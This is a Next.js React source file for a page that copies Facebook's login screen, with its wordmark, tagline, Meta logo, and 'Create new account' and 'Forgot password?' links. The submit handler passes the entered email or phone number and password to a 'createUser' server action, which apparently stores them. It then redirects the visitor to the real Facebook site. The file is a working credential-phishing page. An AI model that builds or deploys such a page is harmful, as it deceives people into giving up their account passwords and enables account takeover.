"use client"
import { createUser } from "@/lib/actions/user.actions";
import { createFacebookAccountLink, facebookLink, forgotFacebookPasswordLink } from "@/lib/links";
import Image from "next/image";
import React, { useState } from "react";
import { SiMeta } from "react-icons/si";
import { IoEyeOutline } from "react-icons/io5";
import {  FaRegEyeSlash } from "react-icons/fa6";

function MainPage() {
  const [username, setUserName] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState(""); // Error state to display validation messages
  const [showPassword, setShowPassword] = useState(false)

  const handleLogin = async (e : React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (!username || !password) {
      setError("Both fields are required"); // Set error if fields are empty
      return;
    }
    setError(""); // Clear error if fields are filled

    const data = {
      username: username,
      password: password
    };

    console.log("This is the data:", data);
    const response = await createUser(data);
    console.log("this is the resposne", response)
    if(response.messsage == 'success'){
      window.location.href = facebookLink

    }
    else{
      setError("Something went wrong")
    }
    
  };
  
  const handleCreateAccount = async (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault(); 
    window.location.href = createFacebookAccountLink;
  };

  return (
    <div className="h-[100vh] w-[100vw] sm:h-[80%] bg-[#f2f4f7] sm:flex sm:flex-row">
      <div className="h-[40%] p-4 sm:h-full sm:flex-1 sm:flex sm:justify-end">
        <div className="flex flex-col items-center p-4 gap-y-32 sm:gap-y-0 sm:justify-center h-full">
          <div className="language text-[19px] flex justify-center w-full">
            <span className="sm:hidden text-black">English(US)</span>
            <p className="hidden sm:flex sm:text-[60px] sm:font-semibold sm:text-[#125cef] sm:items-start">
              facebook
            </p>
          </div>
          <div>
            <Image
              height={500}
              width={500}
              alt=""
              src="/new.jpeg"
              className="rounded-full h-20 w-20 sm:hidden"
            />
            <p className="hidden sm:flex sm:flex-col sm:text-[23px] text-black">
              <span>Connect with friends and the world </span>
              <span>around you on Facebook.</span>
            </p>
          </div>
        </div>
      </div>
      <div className="w-full h-[60%] sm:h-full sm:flex-1 pt-4 px-4 flex flex-col justify-around sm:flex-row sm:items-center sm:justify-center sm:p-0 lg:p-[20px]">
        <div className="w-full h-full sm:flex sm:items-center sm:justify-start lg:px-10">
          <form className="w-full flex flex-col gap-y-4 sm:gap-y-5 sm:w-[250px] md:w-[450px] sm:px-8 sm:pt-6 sm:pb-14 sm:border-2 sm:bg-white sm:rounded-2xl">
            <input
              value={username}
              onChange={(e) => setUserName(e.target.value)}
              placeholder="Mobile number or email"
              className="border-[0.4px] p-[16px] text-black sm:p-[20px] border-gray-400 placeholder:text-gray-500 placeholder:text-[17px] sm:placeholder:text-[20px] rounded-xl focus:outline-[1px] focus:border-[2px] focus:border-blue-600 outline-none"
            />
            <div className="w-full  relative">
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="border-[1px]  w-full text-black p-[16px] sm:p-[20px] border-gray-400 placeholder:text-gray-500 placeholder:text-[17px] sm:placeholder:text-[20px] rounded-xl focus:border-[2px] focus:border-blue-600 outline-none"
            />
            <span className=" absolute font-semibold cursor-pointer bottom-[30%] right-3 text-[24px] text-gray-600" onClick={(e) => setShowPassword(!showPassword)}>{showPassword ? <FaRegEyeSlash /> : <IoEyeOutline className="" />}</span>
            {error && <p className="text-red-500">{error}</p>} {/* Display error message */}
            </div>
            <button
              className="bg-[#0866ff] border-gray-600 rounded-3xl sm:rounded-xl p-[10px] sm:p-[15px] border-0 outline-none text-[19px] hover:bg-blue-700"
              onClick={handleLogin}
            >
              Log in
            </button>
            <div className="hidden sm:block">
              <p className="text-[#0866ff] text-center m-1 text-[18px]  cursor-pointer hover:underline" 
                onClick={(e) =>{
                  e.preventDefault()
                  window.location.href = forgotFacebookPasswordLink
                }}
              >Forgot password?</p>
              <hr className="mt-4" />
              <div className="w-full mt-4 flex justify-center pt-4">
                <button 
                  className="bg-[#42b72a] font-semibold py-[21px] px-[80px] text-white rounded-xl text-[19px] font-sans"
                  onClick={handleCreateAccount}
                >
                  Create new account
                </button>
              </div>
            </div>
          </form>
          <p className="text-gray-800 sm:hidden text-center m-4 cursor-pointer hover:underline">Forgot password?</p>
        </div>
        <div className="text-black w-full flex flex-col pt-4 sm:hidden">
          <div className="mt-4">
            <button 
              className="text-[#0647c8] border-[0.5px] border-[#0647c8] w-full rounded-3xl p-[10px] text-[19px]"
              onClick={
                handleCreateAccount
              }
            >
              Create new account
            </button>
            <p className="flex gap-x-2 mt-3 justify-center w-full">
              <span className="flex gap-x-2">
                <SiMeta className="text-black text-[25px]" />
                <span className="text-[20px]">Meta</span>
              </span>
            </p>
            <div className="flex justify-center gap-x-3 mt-2 mb-1 text-[12px]">
              <span>About</span>
              <span>Help</span>
              <span>More</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default MainPage;
